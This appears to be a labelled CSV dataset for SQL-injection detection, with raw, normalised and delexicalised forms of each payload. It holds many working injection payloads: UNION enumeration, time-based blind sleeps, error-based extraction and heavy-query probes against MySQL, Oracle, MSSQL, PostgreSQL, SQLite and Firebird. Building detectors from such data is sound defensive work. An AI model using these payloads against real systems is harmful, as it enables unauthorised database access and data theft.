payload_raw,payload_norm,payload_delex,label,is_obfuscated,sqli_type_hint,source
"1"" where 1683  =  1683 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #","1"" where 1683 = 1683 or ( select * from ( select ( sleep ( 5 ) ) ) sddo ) #","<NUM>"" where <NUM> = <NUM> or ( select * from ( select ( sleep ( <NUM> ) ) ) sddo ) #",1,False,,sqli_dataset
"-1908""  )   where 6420  =  6420 union all select 6420,6420,6420,6420--","-1908"" ) where 6420 = 6420 union all select 6420,6420,6420,6420--","-<NUM>"" ) where <NUM> = <NUM> union all select <NUM>,<NUM>,<NUM>,<NUM>--",1,False,,sqli_dataset
"1""   )    )    and make_set  (  8403  =  8403,8899  )   and    (    (   ""nsyl""  =  ""nsyl","1"" ) ) and make_set ( 8403 = 8403,8899 ) and ( ( ""nsyl"" = ""nsyl",<NUM><STR>nsyl<STR>nsyl,1,False,,sqli_dataset
waitfor delay '0:0:5' and   (  '%'  =  ',waitfor delay '0:0:5' and ( '%' = ',waitfor delay <STR> and ( <STR> = ',1,False,,sqli_dataset
"-5800""  )   or 6872  =  6872 and   (  ""tcab"" like ""tcab","-5800"" ) or 6872 = 6872 and ( ""tcab"" like ""tcab",-<NUM><STR>tcab<STR>tcab,1,False,,sqli_dataset
select   (  case when   (  4415  =  2051  )   then 4415 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,select ( case when ( 4415 = 2051 ) then 4415 else cast ( 1 as int ) / ( select 0 from dual ) end ) from dual--,select ( case when ( <NUM> = <NUM> ) then <NUM> else cast ( <NUM> as int ) / ( select <NUM> from dual ) end ) from dual--,1,False,,sqli_dataset
"-6097%'   )    )    union all select 3990,3990,3990,3990,3990,3990--","-6097%' ) ) union all select 3990,3990,3990,3990,3990,3990--","-<NUM>%' ) ) union all select <NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>--",1,False,,sqli_dataset
1' and 9198  =  9198--,1' and 9198 = 9198--,<NUM>' and <NUM> = <NUM>--,1,False,,sqli_dataset
"1%""   )    )    or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --","1%"" ) ) or 1022 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --","<NUM>%"" ) ) or <NUM> = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1,False,,sqli_dataset
1'  )   as xwlf where 9424  =  9424,1' ) as xwlf where 9424 = 9424,<NUM>' ) as xwlf where <NUM> = <NUM>,1,False,,sqli_dataset
"1""  )   as xsgx where 5239  =  5239 union all select null,null--","1"" ) as xsgx where 5239 = 5239 union all select null,null--","<NUM>"" ) as xsgx where <NUM> = <NUM> union all select null,null--",1,False,,sqli_dataset
"-7737'||  (  select 'xalo' where 9219  =  9219 union all select 9219,9219,9219,9219#","-7737'|| ( select 'xalo' where 9219 = 9219 union all select 9219,9219,9219,9219#","-<NUM><STR>xalo' where <NUM> = <NUM> union all select <NUM>,<NUM>,<NUM>,<NUM>#",1,False,,sqli_dataset
"1%' and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  '","1%' and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) and '%' = '",<NUM>%<STR>%<STR>,1,False,,sqli_dataset
"1'+  (  select 'midn' where 2819  =  2819 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3   )    )   +'","1'+ ( select 'midn' where 2819 = 2819 or 9643 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) ) +'",<NUM><STR>midn<STR>,1,True,,sqli_dataset
"1  )   where 8856  =  8856 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --","1 ) where 8856 = 8856 or 6979 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --","<NUM> ) where <NUM> = <NUM> or <NUM> = like ( <STR>,upper ( hex ( randomblob ( <NUM>/<NUM> ) ) ) ) --",1,False,,sqli_dataset
"-5630""  )   or 3038  =  3038","-5630"" ) or 3038 = 3038","-<NUM>"" ) or <NUM> = <NUM>",1,False,,sqli_dataset
"1' union all select null,null,null,null,null,null--","1' union all select null,null,null,null,null,null--","<NUM>' union all select null,null,null,null,null,null--",1,False,,sqli_dataset
"1  )   where 9012  =  9012 and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --","1 ) where 9012 = 9012 and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --","<NUM> ) where <NUM> = <NUM> and <NUM> = like ( <STR>,upper ( hex ( randomblob ( <NUM>/<NUM> ) ) ) ) --",1,False,,sqli_dataset
"1""  )   where 8657  =  8657","1"" ) where 8657 = 8657","<NUM>"" ) where <NUM> = <NUM>",1,False,,sqli_dataset
"-1302""   )    )    as rshr where 2800  =  2800 or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --","-1302"" ) ) as rshr where 2800 = 2800 or 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) --","-<NUM>"" ) ) as rshr where <NUM> = <NUM> or <NUM> = dbms_utility.sqlid_to_sqlhash ( ( chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) || ( select ( case when ( <NUM> = <NUM> ) then <NUM> else <NUM> end ) from dual ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ) ) --",1,False,,sqli_dataset
1 where 1519  =  1519,1 where 1519 = 1519,<NUM> where <NUM> = <NUM>,1,False,,sqli_dataset
"1"" where 3080  =  3080 or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  --","1"" where 3080 = 3080 or ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8113 = 8113,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) --","<NUM>"" where <NUM> = <NUM> or ( select <NUM>* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( <NUM> = <NUM>,<NUM> ) ) ) ,0x717a767a71,0x78 ) ) s ) , <NUM>, <NUM> ) ) ) --",1,True,,sqli_dataset
1%'   )    )     )   and   (  9404  =  8390  )  *8390 and    (    (     (  '%'  =  ',1%' ) ) ) and ( 9404 = 8390 ) *8390 and ( ( ( '%' = ',<NUM>%<STR>%<STR>,1,False,,sqli_dataset
"-2704""  )   union all select 1323,1323,1323,1323,1323,1323,1323,1323,1323--","-2704"" ) union all select 1323,1323,1323,1323,1323,1323,1323,1323,1323--","-<NUM>"" ) union all select <NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>--",1,False,,sqli_dataset
"1%'   )    )    and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   '%'  =  '","1%' ) ) and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 4241 = 4241 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( '%' = '",<NUM>%<STR>%<STR>,1,True,,sqli_dataset
"1'   )    )     )   and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (     (  'tzbp'  =  'tzbp","1' ) ) ) and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and ( ( ( 'tzbp' = 'tzbp",<NUM><STR>tzbp<STR>tzbp,1,True,,sqli_dataset
1%'  )   and 9198  =  9198--,1%' ) and 9198 = 9198--,<NUM>%' ) and <NUM> = <NUM>--,1,False,,sqli_dataset
"1""   )    )    and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (   ""smnw"" like ""smnw","1"" ) ) and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4386 = 4386 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) and ( ( ""smnw"" like ""smnw",<NUM><STR>smnw<STR>smnw,1,False,,sqli_dataset
"1'   )    )     )   and elt  (  2506  =  2383,2383  )   and    (    (     (  'bjrj'  =  'bjrj","1' ) ) ) and elt ( 2506 = 2383,2383 ) and ( ( ( 'bjrj' = 'bjrj",<NUM><STR>bjrj<STR>bjrj,1,False,,sqli_dataset
"1'||  (  select 'xasp' from dual where 4025  =  4025 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )     )  ||'","1'|| ( select 'xasp' from dual where 4025 = 4025 and exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8190 = 8190,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) ) ||'",<NUM><STR>xasp<STR>,1,True,,sqli_dataset
"1""  )   where 2837  =  2837 and   (  3020  =  3020  )  *6703--","1"" ) where 2837 = 2837 and ( 3020 = 3020 ) *6703--","<NUM>"" ) where <NUM> = <NUM> and ( <NUM> = <NUM> ) *<NUM>--",1,False,,sqli_dataset
1'  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and   (  'zaes'  =  'zaes,1' ) or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ) and ( 'zaes' = 'zaes,<NUM><STR>zaes<STR>zaes,1,False,,sqli_dataset
"-4400 union all select 3983,3983,3983,3983,3983,3983,3983,3983,3983,3983--","-4400 union all select 3983,3983,3983,3983,3983,3983,3983,3983,3983,3983--","-<NUM> union all select <NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>--",1,False,,sqli_dataset
"1'+  (  select jidy where 2989  =  2989 procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #","1'+ ( select jidy where 2989 = 2989 procedure analyse ( extractvalue ( 9627,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x4b774c75 ) ) ) ) ) ,1 ) #","<NUM>'+ ( select jidy where <NUM> = <NUM> procedure analyse ( extractvalue ( <NUM>,concat ( 0x5c, ( benchmark ( <NUM>,md5 ( 0x4b774c75 ) ) ) ) ) ,<NUM> ) #",1,True,,sqli_dataset
"1'   )    )    and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (   'tqpj'  =  'tqpj","1' ) ) and 6510 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) and ( ( 'tqpj' = 'tqpj",<NUM><STR>tqpj<STR>tqpj,1,False,,sqli_dataset
"1%'   )    )     )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --","1%' ) ) ) or 2367 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --","<NUM>%' ) ) ) or <NUM> = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1,False,,sqli_dataset
"1  )   as ewnv where 3393  =  3393 and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --","1 ) as ewnv where 3393 = 3393 and 2716 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --","<NUM> ) as ewnv where <NUM> = <NUM> and <NUM> = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1,False,,sqli_dataset
"-9751""   )    )     )   or 5929  =  3884--","-9751"" ) ) ) or 5929 = 3884--","-<NUM>"" ) ) ) or <NUM> = <NUM>--",1,False,,sqli_dataset
"1'+  (  select 'bsva' where 4378  =  4378 or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4   )    )   +'","1'+ ( select 'bsva' where 4378 = 4378 or 7552 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) ) +'",<NUM><STR>bsva<STR>,1,True,,sqli_dataset
1 and 6969  =    (  select 6969 from pg_sleep  (  5   )    ),1 and 6969 = ( select 6969 from pg_sleep ( 5 ) ),<NUM> and <NUM> = ( select <NUM> from pg_sleep ( <NUM> ) ),1,False,,sqli_dataset
"1""  )   where 5005  =  5005 procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )  --","1"" ) where 5005 = 5005 procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50 ) ) ) ) ) ,1 ) --","<NUM>"" ) where <NUM> = <NUM> procedure analyse ( extractvalue ( <NUM>,concat ( 0x5c, ( benchmark ( <NUM>,md5 ( 0x52515a50 ) ) ) ) ) ,<NUM> ) --",1,True,,sqli_dataset
"1%'  )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and   (  '%'  =  '","1%' ) or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select ( elt ( 1297 = 1297,1 ) ) ) ,0x717a767a71 ) ) and ( '%' = '",<NUM>%<STR>%<STR>,1,True,,sqli_dataset
"1"" and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )","1"" and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 )","<NUM>"" and <NUM> = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 )",1,False,,sqli_dataset
"-1628"" union all select 9189,9189,9189,9189,9189,9189,9189,9189,9189--","-1628"" union all select 9189,9189,9189,9189,9189,9189,9189,9189,9189--","-<NUM>"" union all select <NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>--",1,False,,sqli_dataset
"1""  )   as ckoi where 4674  =  4674 union all select null,null,null,null,null,null,null,null,null,null#","1"" ) as ckoi where 4674 = 4674 union all select null,null,null,null,null,null,null,null,null,null#","<NUM>"" ) as ckoi where <NUM> = <NUM> union all select null,null,null,null,null,null,null,null,null,null#",1,False,,sqli_dataset
"-8166""   )    )     )   or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (     (  ""lcqb""  =  ""lcqb","-8166"" ) ) ) or 5903 = ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' ) and ( ( ( ""lcqb"" = ""lcqb",-<NUM><STR>lcqb<STR>lcqb,1,False,,sqli_dataset
"1' in boolean mode  )   or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  #","1' in boolean mode ) or 7552 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) #","<NUM>' in boolean mode ) or <NUM> = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) #",1,False,,sqli_dataset
"-8419  )   where 8692  =  8692 union all select 8692,8692,8692--","-8419 ) where 8692 = 8692 union all select 8692,8692,8692--","-<NUM> ) where <NUM> = <NUM> union all select <NUM>,<NUM>,<NUM>--",1,False,,sqli_dataset
1  )   as nmlm where 9872  =  9872,1 ) as nmlm where 9872 = 9872,<NUM> ) as nmlm where <NUM> = <NUM>,1,False,,sqli_dataset
"1""  )   union all select null,null,null,null,null,null,null,null#","1"" ) union all select null,null,null,null,null,null,null,null#","<NUM>"" ) union all select null,null,null,null,null,null,null,null#",1,False,,sqli_dataset
-3161'  )   or 8501  =  1796,-3161' ) or 8501 = 1796,-<NUM>' ) or <NUM> = <NUM>,1,False,,sqli_dataset
"1'+  (  select 'jhce' where 1117  =  1117 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5   )    )   +'","1'+ ( select 'jhce' where 1117 = 1117 and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) ) +'",<NUM><STR>jhce<STR>,1,True,,sqli_dataset
"1""   )    )    or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (   ""lano""  =  ""lano","1"" ) ) or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ( ( ""lano"" = ""lano",<NUM><STR>lano<STR>lano,1,False,,sqli_dataset
1' and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and 'psdl' like 'psdl,1' and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and 'psdl' like 'psdl,<NUM><STR>psdl<STR>psdl,1,True,,sqli_dataset
"1""   )    )     )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  ""oyxk""  =  ""oyxk","1"" ) ) ) or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9173 = 9173,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and ( ( ( ""oyxk"" = ""oyxk",<NUM><STR>oyxk<STR>oyxk,1,True,,sqli_dataset
"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  7711  =  7711","select like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( 7711 = 7711","select like ( <STR>,upper ( hex ( randomblob ( <NUM>/<NUM> ) ) ) ) and ( <NUM> = <NUM>",1,False,,sqli_dataset
"-6600'  )   union all select 5566,5566#","-6600' ) union all select 5566,5566#","-<NUM>' ) union all select <NUM>,<NUM>#",1,False,,sqli_dataset
1'  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  ),1' ) and ( select * from ( select ( sleep ( 5 ) ) ) fzno ),<NUM>' ) and ( select * from ( select ( sleep ( <NUM> ) ) ) fzno ),1,False,,sqli_dataset
"-9721' or elt  (  9511  =  9238,9238  )","-9721' or elt ( 9511 = 9238,9238 )","-<NUM>' or elt ( <NUM> = <NUM>,<NUM> )",1,False,,sqli_dataset
"1'  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )","1' ) and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select ( elt ( 7982 = 7982,1 ) ) ) ,0x717a767a71 ) )","<NUM>' ) and extractvalue ( <NUM>,concat ( 0x5c,0x7171706a71, ( select ( elt ( <NUM> = <NUM>,<NUM> ) ) ) ,0x717a767a71 ) )",1,True,,sqli_dataset
"1%"" or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #","1%"" or ( select * from ( select ( sleep ( 5 ) ) ) sddo ) #","<NUM>%"" or ( select * from ( select ( sleep ( <NUM> ) ) ) sddo ) #",1,False,,sqli_dataset
"select pg_sleep  (  5  )   and ""ilyw"" like ""ilyw","select pg_sleep ( 5 ) and ""ilyw"" like ""ilyw","select pg_sleep ( <NUM> ) and <STR> like ""ilyw",1,False,,sqli_dataset
-2820'   )    )    or 6679  =  8848--,-2820' ) ) or 6679 = 8848--,-<NUM>' ) ) or <NUM> = <NUM>--,1,False,,sqli_dataset
"-6453""   )    )    as hehs where 9363  =  9363 union all select 9363,9363,9363,9363,9363,9363,9363,9363,9363#","-6453"" ) ) as hehs where 9363 = 9363 union all select 9363,9363,9363,9363,9363,9363,9363,9363,9363#","-<NUM>"" ) ) as hehs where <NUM> = <NUM> union all select <NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>#",1,False,,sqli_dataset
"1"" and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and ""zwov""  =  ""zwov","1"" and 8407 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ""zwov"" = ""zwov",<NUM><STR>zwov<STR>zwov,1,False,,sqli_dataset
1'   )    )    as oyad where 7161  =  7161 and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  --,1' ) ) as oyad where 7161 = 7161 and 6240 = ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ) --,<NUM><STR>qqpjq<STR>qzvzq' ) --,1,False,,sqli_dataset
"1   )    )    as kgit where 1919  =  1919 and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --","1 ) ) as kgit where 1919 = 1919 and char ( 109 ) ||char ( 79 ) ||char ( 70 ) ||char ( 90 ) = regexp_substring ( repeat ( right ( char ( 5012 ) ,0 ) ,5000000000 ) ,null ) --","<NUM> ) ) as kgit where <NUM> = <NUM> and char ( <NUM> ) ||char ( <NUM> ) ||char ( <NUM> ) ||char ( <NUM> ) = regexp_substring ( repeat ( right ( char ( <NUM> ) ,<NUM> ) ,<NUM> ) ,null ) --",1,False,,sqli_dataset
1   )    )    as mcyh where 1001  =  1001,1 ) ) as mcyh where 1001 = 1001,<NUM> ) ) as mcyh where <NUM> = <NUM>,1,False,,sqli_dataset
"1' or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and 'usnh' like 'usnh","1' or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select ( elt ( 1297 = 1297,1 ) ) ) ,0x717a767a71 ) ) and 'usnh' like 'usnh",<NUM><STR>usnh<STR>usnh,1,True,,sqli_dataset
"1%""   )    )    and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   ""%""  =  ""","1%"" ) ) and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7756 = 7756 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( ""%"" = """,<NUM>%<STR>%<STR>,1,False,,sqli_dataset
"-5207  )   where 6987  =  6987 or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --","-5207 ) where 6987 = 6987 or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 1570 = 1570 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) --","-<NUM> ) where <NUM> = <NUM> or <NUM> = convert ( int, ( select char ( <NUM> ) +char ( <NUM> ) +char ( <NUM> ) +char ( <NUM> ) +char ( <NUM> ) + ( select ( case when ( <NUM> = <NUM> ) then char ( <NUM> ) else char ( <NUM> ) end ) ) +char ( <NUM> ) +char ( <NUM> ) +char ( <NUM> ) +char ( <NUM> ) +char ( <NUM> ) ) ) --",1,True,,sqli_dataset
"-1287""  )   as bbzg where 1475  =  1475 union all select 1475,1475,1475,1475,1475,1475,1475,1475,1475#","-1287"" ) as bbzg where 1475 = 1475 union all select 1475,1475,1475,1475,1475,1475,1475,1475,1475#","-<NUM>"" ) as bbzg where <NUM> = <NUM> union all select <NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>#",1,False,,sqli_dataset
"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and 'fpaf'  =  'fpaf","select like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and 'fpaf' = 'fpaf","select like ( <STR>,upper ( hex ( randomblob ( <NUM>/<NUM> ) ) ) ) and <STR> = 'fpaf",1,False,,sqli_dataset
